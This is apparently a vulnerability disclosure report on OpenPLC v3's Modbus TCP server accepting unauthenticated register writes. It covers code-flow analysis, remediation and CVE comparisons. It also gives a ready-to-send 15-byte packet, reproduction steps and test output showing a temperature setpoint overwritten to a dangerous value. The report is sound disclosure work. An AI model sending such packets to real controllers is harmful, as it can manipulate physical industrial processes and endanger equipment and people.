# Vulnerability Report: OpenPLC v3 ModbusTCP Unrestricted Holding Register Write

## Metadata

| Field | Value |
|-------|-------|
| **Vendor** | OpenPLC Project (Thiago Alves) |
| **Product** | OpenPLC Runtime v3 |
| **Product URL** | https://github.com/thiagoralves/OpenPLC_v3 |
| **Affected Version** | OpenPLC_v3 master branch (all versions using `webserver/core/modbus.cpp`) |
| **Tested Version** | OpenPLC_v3 (downloaded 2026-01, Docker build on debian:trixie) |
| **CWE** | CWE-306: Missing Authentication for Critical Function |

---

## 1. Summary

An unrestricted write vulnerability exists in the Modbus TCP server functionality of OpenPLC_v3. The `WriteMultipleRegisters()` function in `webserver/core/modbus.cpp` accepts FC=16 (Write Multiple Registers) requests from any unauthenticated network client without performing any access control check on the target register addresses. An attacker who can reach TCP port 502 on the OpenPLC host can overwrite **any** holding register (addresses 0–8191) in a single Modbus request, including registers that map directly to PLC output variables (%QW) controlling physical actuators.

OpenPLC provides **no mechanism** — configurable or hardcoded — to restrict which registers can be written remotely.

---

## 2. Confirmed Vulnerable Version

OpenPLC Runtime v3, downloaded from `https://github.com/thiagoralves/OpenPLC_v3` (master branch).

The vulnerability is present in `webserver/core/modbus.cpp` which has remained structurally unchanged across all known versions of OpenPLC v3.

---

## 3. Technical Details

OpenPLC is an open-source programmable logic controller (PLC) designed for automation and ICS security research. It supports Modbus TCP on TCP/502 and EtherNet/IP. The runtime can be deployed on Linux, Windows, and embedded platforms. OpenPLC is widely cited in academic ICS security research and is used in educational and small-scale industrial deployments.

### 3.1 Vulnerability Root Cause

The vulnerability exists in the processing path for Modbus Function Code 16 (Write Multiple Registers). The code performs no authentication, authorization, or access control at any point in the request processing chain. The complete call path is:

**`server.cpp:startServer()` → `server.cpp:handleConnections()` → `server.cpp:processMessage()` → `modbus.cpp:processModbusMessage()` → `modbus.cpp:WriteMultipleRegisters()` → `modbus.cpp:writeToRegisterWithoutLocking()`**

### 3.2 Code Flow Analysis

When a Modbus TCP client connects to port 502, `startServer()` in `server.cpp` accepts the connection and spawns a handler thread. The handler calls `processMessage()` ([1]), which dispatches to `processModbusMessage()` ([2]):

```c
// server.cpp — processMessage()
void processMessage(unsigned char *buffer, int bufferSize, int client_fd, int protocol_type)
{
    int messageSize = 0;
    if (protocol_type == MODBUS_PROTOCOL)
    {
        messageSize = processModbusMessage(buffer, bufferSize);  // [1]
    }
    // ...
}
```

Inside `processModbusMessage()`, the function code at `buffer[7]` is checked. **No authentication or client identity check occurs at any point** — not before, during, or after function code dispatch ([2]):

```c
// modbus.cpp — processModbusMessage() (line 1107)
int processModbusMessage(unsigned char *buffer, int bufferSize)
{
    MessageLength = 0;
    uint16_t field1 = (uint16_t)buffer[8] << 8 | (uint16_t)buffer[9];   // Starting Address
    uint16_t field2 = (uint16_t)buffer[10] << 8 | (uint16_t)buffer[11]; // Quantity
    // ...

    // NOTE: buffer[6] (Unit Identifier) is never checked

    else if(buffer[7] == MB_FC_WRITE_MULTIPLE_REGISTERS)  // FC=16 (0x10)
    {
        WriteMultipleRegisters(buffer, bufferSize);  // [2] — no auth check
    }
    // ...
}
```

The `WriteMultipleRegisters()` function (line 727) extracts the Starting Address from `buffer[8..9]` ([3]) and iterates over each register in the request, calling `writeToRegisterWithoutLocking()` to write each value directly into PLC memory ([4]):

```c
// modbus.cpp — WriteMultipleRegisters() (line 727)
void WriteMultipleRegisters(unsigned char *buffer, int bufferSize)
{
    int Start, WordDataLength, ByteDataLength;
    int mb_error = ERR_NONE;

    if (bufferSize < 12)
    {
        ModbusError(buffer, ERR_ILLEGAL_DATA_VALUE);
        return;
    }

    Start = word(buffer[8], buffer[9]);              // [3] Starting Address — attacker-controlled
    WordDataLength = word(buffer[10], buffer[11]);    // Quantity of registers
    ByteDataLength = WordDataLength * 2;

    if ((bufferSize < (13 + ByteDataLength)) || (buffer[12] != ByteDataLength))
    {
        ModbusError(buffer, ERR_ILLEGAL_DATA_VALUE);
        return;
    }

    // NOTE: No access control check on Start or any address in [Start, Start+WordDataLength)

    pthread_mutex_lock(&bufferLock);
    for(int i = 0; i < WordDataLength; i++)
    {
        int position = Start + i;                    // [4] Derived from attacker input
        int error = writeToRegisterWithoutLocking(    // Direct write to PLC memory
            position,
            word(buffer[13 + i * 2], buffer[14 + i * 2])
        );
        if (error != ERR_NONE)
            mb_error = error;
    }
    pthread_mutex_unlock(&bufferLock);
    // ...
}
```

The `writeToRegisterWithoutLocking()` function (line 575) maps the register address to PLC internal memory. For addresses 0–1023, it writes directly to `int_output[]` — the **analog output variables** that control physical actuators ([5]):

```c
// modbus.cpp — writeToRegisterWithoutLocking() (line 575)
int writeToRegisterWithoutLocking(int position, uint16_t value)
{
    if (position < MIN_16B_RANGE)    // addresses 0–1023 → analog outputs
    {
        if (int_output[position] != NULL)
            *int_output[position] = value;  // [5] Direct write to physical output
    }
    else if (position >= MIN_16B_RANGE && position <= MAX_16B_RANGE)  // 1024–2047 → 16-bit memory
    {
        if (int_memory[position - MIN_16B_RANGE] != NULL)
            *int_memory[position - MIN_16B_RANGE] = value;
    }
    else if (position >= MIN_32B_RANGE && position <= MAX_32B_RANGE)  // 2048–4095 → 32-bit memory
    {
        // ...writes to dint_memory[]...
    }
    else if (position >= MIN_64B_RANGE && position <= MAX_64B_RANGE)  // 4096–8191 → 64-bit memory
    {
        // ...writes to lint_memory[]...
    }
    else
        return ERR_ILLEGAL_DATA_ADDRESS;

    return ERR_NONE;
}
```

**Key observation**: Addresses 0–1023 (holding registers `%QW0` through `%QW1023`) map to `int_output[]`, which corresponds to **IEC 61131-3 analog output variables (`%QW`)**. These variables directly control physical outputs such as valve positions, motor speeds, temperature setpoints, and pump commands. Writing to these registers through an unauthenticated Modbus request **immediately changes the physical output state** of the PLC on the next scan cycle.

---

## 4. Attack Scenario

### 4.1 Threat Model

An attacker with network access to an OpenPLC instance on TCP/502 (e.g., via a flat OT network, misconfigured firewall, or compromised engineering workstation) can overwrite any holding register in a single Modbus TCP request.

### 4.2 Attack Message

The following 15-byte Modbus TCP request overwrites holding register `0x0064` (decimal 100, mapped to `%QW100`) with the value `0x0384` (decimal 900):

```
00 01 00 00 00 09 01 10 00 64 00 01 02 03 84
|___| |___| |___| |  |  |___| |___| |  |___|
  |     |     |   |  FC  Addr  Qty  BC  Value
  |     |     |   Unit ID
  |     |     Length (9 bytes follow)
  |     Protocol ID (Modbus)
  Transaction ID
```

| Byte(s) | Field | Value | Meaning |
|---------|-------|-------|---------|
| 0–1 | Transaction ID | `0x0001` | Arbitrary |
| 2–3 | Protocol ID | `0x0000` | Modbus |
| 4–5 | Length | `0x0009` | 9 bytes follow |
| 6 | Unit Identifier | `0x01` | Slave 1 |
| 7 | Function Code | `0x10` | Write Multiple Registers |
| 8–9 | Starting Address | `0x0064` | Target register (attacker-chosen) |
| 10–11 | Quantity | `0x0001` | 1 register |
| 12 | Byte Count | `0x02` | 2 data bytes |
| 13–14 | Register Value | `0x0384` | 900 (malicious setpoint) |

### 4.3 Physical Impact

In an industrial deployment where register `%QW100` stores a temperature setpoint:

1. The attacker sends the above 15-byte packet.
2. `WriteMultipleRegisters()` writes `900` to `int_output[100]` (`%QW100`).
3. On the next PLC scan cycle (~100ms), the PLC program reads the new setpoint.
4. The PID control loop drives the heater to reach 900°C (far above the safe range of 120–180°C).
5. Without independent safety instrumented systems (SIS), this leads to overheating, overpressure, and potential equipment damage.

---

## 5. Proof of Concept

### 5.1 Test Environment

| Component | Configuration |
|-----------|---------------|
| **Target** | OpenPLC v3, Docker container (debian:trixie), `openplc_modbus` |
| **Modbus Port** | TCP/502 (default) |
| **PLC Program** | IEC 61131-3 ST with holding registers at `%QW0`–`%QW3` and `%IW0`–`%IW1` |
| **Attacker** | Python 3.11 with raw TCP sockets, container `modbus_client` |
| **Network** | Docker bridge 172.20.0.0/24 |

### 5.2 Reproduction Steps

1. Deploy OpenPLC v3 via Docker with a Modbus-enabled ST program
2. Start the PLC runtime via the web interface (port 8080)
3. From any host with TCP access to port 502, send the 15-byte attack message
4. Read back the register via FC=03 to confirm the value has been overwritten

### 5.3 POC Script

Full POC code: `poc_write_multiple_regs_starting_addr.py` (same directory).

### 5.4 Test Results

**Phase 1 — Initialization** (set known values via FC=16):

```
reg[99]  (0x0063) = 1111   ← sentinel value
reg[100] (0x0064) =  150   ← safe setpoint (target register)
reg[101] (0x0065) = 3333   ← sentinel value
```

**Phase 2 — Attack** (single FC=16 request):

```
TX: 00 03 00 00 00 09 01 10 00 64 00 01 02 03 84
RX: 00 03 00 00 00 06 01 10 00 64 00 01   ← normal response (write confirmed)

Post-attack state:
  reg[99]  (0x0063) = 1111   ← UNCHANGED (attack precision verified)
  reg[100] (0x0064) =  900   ← OVERWRITTEN (150 → 900)
  reg[101] (0x0065) = 3333   ← UNCHANGED (attack precision verified)
```

**Phase 3 — Address Space Sweep** (5 different addresses tested):

| Address | Decimal | Written | Read-back | Result |
|---------|---------|---------|-----------|--------|
| `0x0000` | 0 | 500 | 500 | ✓ Write confirmed |
| `0x0032` | 50 | 600 | 600 | ✓ Write confirmed |
| `0x0064` | 100 | 700 | 700 | ✓ Write confirmed |
| `0x00C8` | 200 | 800 | 800 | ✓ Write confirmed |
| `0x01F4` | 500 | 999 | 999 | ✓ Write confirmed |

**Result: 5/5 addresses across the holding register space are writable without authentication.**

---

## 6. Impact

The vulnerability allows an unauthenticated remote attacker to overwrite any holding register (0–8191) via a single network request to TCP/502. No privileges, user interaction, or race conditions are required. The attack directly affects physical processes beyond the PLC software boundary — registers in the `%QW` (analog output) range immediately drive physical actuators on the next scan cycle.

### ICS-Specific Safety Impact

In ICS/SCADA deployments, holding registers that map to `%QW` (analog outputs) directly drive physical actuators. Overwriting these registers can:

- **Manipulate temperature/pressure setpoints** → overheating, overpressure, equipment damage
- **Override safety interlock flags** → disable protective systems
- **Alter valve/motor speed commands** → loss of process control
- **Modify calibration parameters** → measurement drift and quality degradation

---

## 7. CWE Classification

| CWE | Name | Application |
|-----|------|-------------|
| **CWE-306** | Missing Authentication for Critical Function | The Modbus TCP write path performs no authentication. This is the primary CWE. |
| CWE-862 | Missing Authorization | Even if authentication were added, there is no register-level permission model. |

**Primary CWE: CWE-306** — consistent with CVE-2025-48466 (Advantech, CWE-863), CVE-2025-54848 (Socomec, CWE-306), and CVE-2024-11737 (Schneider, CWE-20).

---

## 8. MITRE ATT&CK for ICS Mapping

| Technique ID | Name | Relevance |
|-------------|------|-----------|
| **T0855** | Unauthorized Command Message | Sending FC=16 to write registers without authorization |
| **T0836** | Modify Parameter | Overwriting setpoint/threshold registers |
| **T0831** | Manipulation of Control | Altering PLC output values to affect physical process |
| **T0856** | Spoof Reporting Message | Potential follow-up: overwrite input registers to hide the attack |

---

## 9. Comparison with Accepted CVEs

The following CVEs have been assigned for the **same class of vulnerability** (unauthenticated Modbus register/coil write) on other products:

| CVE ID | Product | Year | CVSS | FC | CWE | Status |
|--------|---------|------|------|----|-----|--------|
| CVE-2025-48466 | Advantech WISE-40x0 | 2025 | 8.1 | FC=05 | CWE-863 | **Assigned** |
| CVE-2025-54848 | Socomec DIRIS M-70 | 2025 | 7.5 | FC=06 | CWE-306 | **Assigned** |
| CVE-2025-54849 | Socomec DIRIS M-70 | 2025 | 7.5 | FC=06 | CWE-306 | **Assigned** |
| CVE-2024-11737 | Schneider Modicon | 2024 | 9.8 | Multiple | CWE-20 | **Assigned** |
| CVE-2025-53476 | **OpenPLC v3** | 2025 | 5.3 | N/A | CWE-775 | **Assigned (Talos)** |

OpenPLC v3 has an established CNA relationship with **Cisco Talos** (CVE-2024-34026, CVE-2024-39590, CVE-2025-53476, CVE-2025-54811). This vulnerability affects a different component (Modbus register write path) and different CWE (CWE-306 vs CWE-775) than existing OpenPLC CVEs.

---

## 10. Suggested Remediation

### 10.1 Short-term: Register Write Protection

Add a per-register access control check in `WriteMultipleRegisters()` before writing:

```c
// Proposed fix in modbus.cpp
extern bool register_write_enabled[MAX_HOLD_REGS];  // configurable via web UI

void WriteMultipleRegisters(unsigned char *buffer, int bufferSize)
{
    // ... existing validation ...
    Start = word(buffer[8], buffer[9]);
    WordDataLength = word(buffer[10], buffer[11]);

    // NEW: Check write permission for each target register
    for (int i = 0; i < WordDataLength; i++) {
        if (!register_write_enabled[Start + i]) {
            ModbusError(buffer, ERR_ILLEGAL_DATA_ADDRESS);
            return;
        }
    }
    // ... existing write logic ...
}
```

### 10.2 Medium-term: IP-based Access Control

Add configurable IP whitelisting for Modbus TCP clients in `server.cpp:waitForClient()`:

```c
// Check client IP against whitelist before accepting connection
if (!is_modbus_client_allowed(client_addr.sin_addr)) {
    close(client_fd);
    continue;
}
```

### 10.3 Long-term: Modbus/TCP Security

Implement the Modbus/TCP Security specification (Modbus.org, V2.1 2018) to provide TLS-based mutual authentication and role-based access control.

---

## 11. References

1. OpenPLC v3 source code: `webserver/core/modbus.cpp`, lines 727–774
2. OpenPLC v3 source code: `webserver/core/server.cpp`, lines 181–205
3. Modbus Application Protocol Specification V1.1b3, Section 6.12 "Write Multiple Registers"
4. Modbus/TCP Security Protocol Specification, V2.1 (2018), Modbus.org
5. TALOS-2025-2223 / CVE-2025-53476 — OpenPLC ModbusTCP DoS (prior OpenPLC CVE by Cisco Talos)
6. CISA ICS Advisory ICSA-25-273-05 — OpenPLC_V3 (CISA advisory for OpenPLC)
7. CVE-2025-48466 — Advantech WISE-40x0 unauthenticated Modbus coil write (same vulnerability class)
8. CVE-2025-54848/54849 — Socomec DIRIS unauthenticated Modbus register write (same vulnerability class)
9. Al-Sabbagh et al., "Investigating the Security of OpenPLC: Vulnerabilities, Attacks, and Mitigation Solutions," IEEE Access, 2024
10. NIST SP 800-82 Rev. 3, "Guide to Operational Technology (OT) Security"
